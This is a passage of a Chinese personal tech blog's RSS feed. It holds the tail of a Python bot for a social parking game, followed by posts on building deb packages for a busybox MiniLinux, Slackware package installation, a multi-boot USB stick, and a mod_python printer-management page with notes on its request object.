raw=='timeNotEnough':<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return raw<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return True<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''自动寻找空车位并停车<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def findAndStop(self,car):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for friend in self.friends['friends']:#对每个好友<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#如果停车场满或者同一个好友的不同停车场，不能停<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if friend['full'] == 'f' or friend['userid'] == car['user_id']:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;continue<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;fpark=self.showFriend(friend['userid']) #获取该好友详情<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pid = -1<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for park in fpark['parklist']:#该好友的每个停车场<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pid += 1<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if park['parked']==0 and park['free'] == 0:#空闲而且非免费<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.stopCar(car,friend,pid)#停车<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return True<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''查看自己的汽车，<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;如果有空闲的，则找到空闲车位并停放<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 查看自己的停车场<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;如果有可以贴条的，则贴条<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def run(self):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.getMyCar()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.listFriends()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if self.autoPark: #自动停车<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for mycar in self.mycar['carlist']: #每辆汽车<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if int(mycar['money']) == self.mycar['maxGain']: #钱已经挣满了<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if self.findAndStop(mycar)==True:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print u'停车%s'.encode('utf-8') % mycar['car_name']<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if self.autoPaste: #自动贴条<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;myplace = self.showFriend(self.pid)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pid = -1<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for park in myplace['parklist']: #每个停车场<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pid += 1<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if park['parked'] == 1:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if park['money'] in [10000,15000,18000] or park['money'] &gt; 18000:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print u'%d贴条%s'.encode('utf-8') % (pid,park['name'])<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.harvest(pid)<br>if __name__=='__main__':<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;park = Park()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;park.login('校内账号','校内密码')<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;park.listFriends()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;park.getMyCar()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;while True:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;park.run()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print u'下次运行60分钟后'.encode('utf-8')<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;time.sleep(60*60)<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200963192553122/</guid>
    </item>
    <item>
      <title>
<![CDATA[为MiniLinux编写deb软件包]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200932791454322/</link>
      <description>
<![CDATA[软用Linux2.6.21内核和1.5.1的busybox制作的minilinux, 支持dpkg命令, 这样就可以在Ubuntu下开发deb包, 然后部署到MiniLinux上<br>1. 在Ubuntu上开发hello.deb(只要记住checkinstall就可以了)<br>编写代码并编译<br>vi test.c<br>#include &lt;stdio.h&gt;<br>int main(){<br>&nbsp;&nbsp;&nbsp; printf("Hello, Worlp\n");<br>&nbsp;&nbsp;&nbsp; return 0;<br>}<br>编译, 因为MiniLinux用的是busybox,没有连接库, 所以要用gcc的-static选项静态链接,  <br>gcc -static test.c -o hello<br>制作安装包:<br>sudo apt-get install checkinstall<br>sudo checkinstall<br>报错说找不到make install, 恩, 很明显是checkinstall需要Makefile, 写一个<br>vi Makefile<br>install:<br>&nbsp;&nbsp;&nbsp; cp hello /bin/hello<br>sudo checkinstall<br>全部默认即可, 当前目录下就会生成hello_2009xxxx_i386.deb<br><br>2. 拷贝到MiniLinux上,<br>首先将包放到Ubuntu的web目录下, cp hello_2009xxxx_i386.deb ~/public_html/hello.deb<br>然后从MiniLinux上下载 wget http://192.201.0.66/~hank/hello.deb<br>然后安装dpkg -i hello.deb<br>dpkg -i hello.deb<br>提示dpkg: /var/lib/dpkg/status No such file or directory<br>看来dpkg需要这些文件和文件夹目录<br>mkdir -p /var/lib/dpkg<br>touch /var/lib/dpkg/status<br>继续安装dpkg -i&nbsp; hello.deb<br>提示dpkg: /var/lib/dpkg/info/hello.conffiles No such file or directory<br>继续创建文件 mkdir /var/lib/dpkg/info<br>dpkg -i hello.deb<br>安装成功, 测试<br>$ hello<br>hello, worlp<br>$ dpkg -l<br><br>Tips:<br>可以在bin目录下创建一个脚本, 下次调用wget时就不用那么麻烦了<br>$ vi /bin/wgeth<br>#/bin/sh<br>wget http://192.201.0.111/~hank/$1<br>$ chmod +x /bin/wgeth<br>$ wgeth hello.deb<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200932791454322/</guid>
    </item>
    <item>
      <title>
<![CDATA[Slackware的包管理机制]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009421595621/</link>
      <description>
<![CDATA[Slackwared的包是以tgz结尾的.tar.gz文件，使用命令installpkg xxx.tgz进行安装，installpkg是一个脚本文件<br>里面包含一个install文件夹和对应的usr,bin,sbin,etc之类的文件夹，<br>而install文件夹里的doinstall.sh则包含安装时需要执行的脚本<br><br>安装完Slackware以后，如果要安装其它的包，有两种方法：<br>1. 挂载光盘或iso镜像，然后进入slackware文件夹的a ap x n等子文件夹，然后执行./install-package脚本，可以选择需要的包进行安装<br>2. 直接把slackware文件夹里的tgz包拷贝出来，然后installpkg xxx.tgz<br><br>基于以上理解，在其它发行版上安装tgz包时，可以首先尝试把slackware的installpkg拷贝过来，然后使用installpkg安装；如果installpkg不能工作，可以手工安装，例如a.tgz<br>gunzip a.tgz<br>tar xf a.tar -C /<br>cd /install<br>chmod +x doinstlal.sh<br>cd ..<br>./doinstall.sh<br>rm -fr /install<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009421595621/</guid>
    </item>
    <item>
      <title>
<![CDATA[8G U盘做DOS, WinPE, CDLinux, Ubuntu启动盘]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009318112713715/</link>
      <description>
<![CDATA[分三步, 安装Ubuntu; 拷贝DOS,WinPE,CDLinux文件; 配置引导<br>1. 使用虚拟机安装Ubuntu, <br>创建虚拟机的时候, 制定硬盘为物理硬盘<br>分区为两个分区, 第一个主分区5.4G, FAT32, 挂载为/dos; 第二个主分区ext3,挂载为/<br>注意:虚拟机里一定要去掉USB控制器, N次失败的教训.<br>2.安装完Ubuntu后, 关闭虚拟机, 在Windows下把DOS, WinPE, CDLinux文件拷贝到5G的FAT32分区中<br>3.在Ubuntu的/boot/grub/menu.lst中增加一项<br>title DOS,WinPE,CDLinux<br>root (hd0,0)<br>kernel /boot/grub/memdisk.gz<br>initrd /boot/grub/win99.zip<br><br><a target="_blank" rel="nofollow" href="http://63.dc.ftn.qq.com/ftn_handler/b862de048cda3f97e70d03a38da38d40b4edcf1a4bab62151fa72bb02723efc51e0ca5dc50f96dd441f46b66e4d8fc7a4ed8f83d7f764cde5eb2d2f006de2613/U3.rar?k=5830653876f5be8e8bf256284531544d5204045a515304014f540609551c5204530848015a07504f54095208025551030053525a63376637511e17591131"  >DOS, WinPE, CDLinux压缩文件下载</a>, <span>提取码 b0e8c1fb</span><br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009318112713715/</guid>
    </item>
    <item>
      <title>
<![CDATA[Fw：mod_python的req对象详解]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201002211200164/</link>
      <description>
<![CDATA[<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify"><font face="宋体">简易的网页，使用mod_python比django要方便的多，比如一个打印机管理页面，因此用到一此req的属性，如下：</font><br></p><p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">主要是设置req.content_type="text/html", 以及禁用缓存 req.no_cache=True<br></p><p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify"><font face="宋体"><br>#encoding: utf-8<br>from mod_python imp<wbr>ort apache<br>imp<wbr>ort os,re<br><br>page='''<br>&lt;head&gt;<br>&lt;META HTTP-EQUIV="Pragma" CONTENT="no-cache"&gt;<br>&lt;META HTTP-EQUIV="Cache-Control" CONTENT="no-cache"&gt;<br>&lt;META HTTP-EQUIV="Expires" CONTENT="0"&gt;<br><br>&lt;title&gt;打印机管理&lt;/title&gt;<br>&lt;script src="/js/jquery.js"&gt;&lt;/script&gt;<br>&lt;script type="text/javas<wbr>cript"&gt;<br>function clsJob(){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $.get('/index.py/?clear',function(da<wbr>ta){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(da<wbr>ta==''){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $("#jobs").html('队列中没有作业');<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alert("打印队列已清空");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alert(da<wbr>ta);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; });<br>}<br>function openPr(){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $.get('/index.py/?open',function(da<wbr>ta){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(da<wbr>ta=='already'){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alert('打印机已经打开');<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(da<wbr>ta=='succeed' || da<wbr>ta=='already'){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $('#status').html('&lt;font color="green"&gt;正常&lt;/font&gt;');<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alert('出错了,RP有问题,去看看打印机开了没');<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; });<br>}<br>&lt;/script&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>打印机 状态: &lt;span id="status"&gt;%s&lt;/span&gt;<br>&lt;hr&gt;<br>&lt;div id="jobs"&gt;<br>&lt;a href="javas<wbr>cript:void(0);" on<wbr>click="javas<wbr>cript:clsJob();"&gt;清空打印队列&lt;/a&gt;<br>&lt;/body&gt;<br>'''<br>def index(req):<br>&nbsp;&nbsp;&nbsp; req.content_type="text/html;charset=UTF-8"<br>&nbsp;&nbsp;&nbsp; req.no_cache=True<br>&nbsp;&nbsp;&nbsp; act=req.args<br>&nbsp;&nbsp;&nbsp; if act==None:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.write(page % prInfo())<br>&nbsp;&nbsp;&nbsp; elif act=='open':<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.write(open())<br>&nbsp;&nbsp;&nbsp; elif act=='clear':<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.write(clsJob())<br>&nbsp;&nbsp;&nbsp; else:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.write('failed')<br>&nbsp;&nbsp;&nbsp; req.flush()<br>def open():<br>&nbsp;&nbsp;&nbsp; info=rawInfo()<br>&nbsp;&nbsp;&nbsp; if not isReady(info):<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; raw=os.popen('/usr/sbin/cupsenable CBIB-Printer').read()<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if raw=='':<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result='succeed'<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result='failed'<br>&nbsp;&nbsp;&nbsp; else:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result='already'<br>&nbsp;&nbsp;&nbsp; return result<br><br><br><br>def prInfo(info=None):<br>&nbsp;&nbsp;&nbsp; if info==None:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; info=rawInfo()<br><br>&nbsp;&nbsp;&nbsp; if isReady(info):<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ready='&lt;font color="green"&gt;正常&lt;/font&gt;'<br>&nbsp;&nbsp;&nbsp; else:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ready='&lt;font color="red"&gt;暂停&lt;/font&gt;&amp;nbsp;&lt;a href="javas<wbr>cript:void(0);" on<wbr>click="javas<wbr>cript:openPr();"&gt;打开&lt;/a&gt;'<br>&nbsp;&nbsp;&nbsp; if info[1]=='no entries':<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jobs='队列中没有作业'<br>&nbsp;&nbsp;&nbsp; else:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jobs="作业列表:&lt;br&gt;"+'&lt;br&gt;'.join(info[2:])<br>&nbsp;&nbsp;&nbsp; return (ready,jobs)<br><br>def rawInfo():<br>&nbsp;&nbsp;&nbsp; return os.popen('lpq').read().split('\n')<br><br>def isReady(info=None):<br>&nbsp;&nbsp;&nbsp; if info==None:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; info=rawInfo()<br>&nbsp;&nbsp;&nbsp; raw=re.findall('not',info[0])<br>&nbsp;&nbsp;&nbsp; if len(raw)==0:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return True<br>&nbsp;&nbsp;&nbsp; else:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return False<br><br>def clsJob():<br>&nbsp;&nbsp;&nbsp; return os.popen('/usr/bin/lprm').read()<br><br></font></p><p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify"><font face="宋体"><br></font></p><p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify"><font face="宋体">请求对象是映射到</font><font face="Courier New, monospace"><span lang="en-US">apache</span></font><font face="宋体">的</font><font face="Courier New, monospace"><span lang="en-US">request_rec</span></font><font face="宋体">结构的对象。当处理器被调用时，会传递唯一个的一个参数就是请求对象。可以为请求对象指定属性，用于在处理器之间通信。如下是方法：</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>add_common_vars()</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">间接调用</font><font face="Courier New, monospace"><span lang="en-US">ap_add_common_vars()</span></font><font face="宋体">函数。调用后，</font><font face="Courier New, monospace"><span lang="en-US">req.subprocess_env</span></font><font face="宋体">会包含大量的</font><font face="Courier New, monospace"><span lang="en-US">CGI</span></font><font face="宋体">信息。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>add_handler(htype,handler[,dir])</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">允许动态注册处理器。</font><font face="Courier New, monospace"><span lang="en-US">htype</span></font><font face="宋体">是要添加的处理器的标志，如</font><font face="Courier New, monospace"><span lang="en-US">'PythonHandler'</span></font><font face="宋体">，但不可以是过滤器</font><font face="Courier New, monospace"><span lang="en-US">(filter)</span></font><font face="宋体">或连接</font><font face="Courier New, monospace"><span lang="en-US">(connection)</span></font><font face="宋体">。</font><font face="Courier New, monospace"><span lang="en-US">handler</span></font><font face="宋体">是包含模块名或函数名的处理器函数。可选参数</font><font face="Courier New, monospace"><span lang="en-US">dir</span></font><font face="宋体">是需要添加到</font><font face="Courier New, monospace"><span lang="en-US">pythonpath</span></font><font face="宋体">环境变量的路径。如果未指定目录，而且有同类型的处理器，则继承路径，否则用前一路径。如果有</font><font face="Courier New, monospace"><span lang="en-US">PythonPath</span></font><font face="宋体">标志存在，则</font><font face="Courier New, monospace"><span lang="en-US">sys.path</span></font><font face="宋体">将会设置为它。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">通过这种方式添加的处理器生存期为这个请求。为同一个类型添加多个处理器是很有用的，不过要注意避免死循环</font><font face="Courier New, monospace"><span lang="en-US">(infinite
loop)</span></font><font face="宋体">。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">动态注册处理器是一种很有用的技术，比如用于</font><font face="Courier New, monospace"><span lang="en-US">PythonAuthenHandler</span></font><font face="宋体">，可以为不同的认证级别指定不同的权限。如：</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font color="#0000ff"><font face="Courier New, monospace"><span lang="en-US">if
manager:</span></font></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font color="#0000ff"><font face="Courier New, monospace"><span lang="en-US">req.add_handler("PythonHandler","menu::admin")</span></font></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font color="#0000ff"><font face="Courier New, monospace"><span lang="en-US">else:</span></font></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font color="#0000ff"><font face="Courier New, monospace"><span lang="en-US">req.add_handler("PythonHandler","menu::basic")</span></font></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">注意，如果传递了一个无效处理器，则会在寻找处理器时发生异常。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
